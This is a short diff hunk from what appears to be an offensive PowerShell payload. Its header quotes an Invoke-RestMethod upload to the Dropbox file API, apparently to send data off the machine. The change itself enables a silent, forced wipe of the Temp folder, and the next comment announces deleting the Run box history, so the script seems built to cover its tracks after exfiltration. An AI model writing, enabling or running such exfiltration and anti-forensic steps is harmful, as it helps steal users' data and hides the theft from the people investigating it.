@@ -387,7 +387,7 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 
 # Delete contents of Temp folder 
 
-#rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
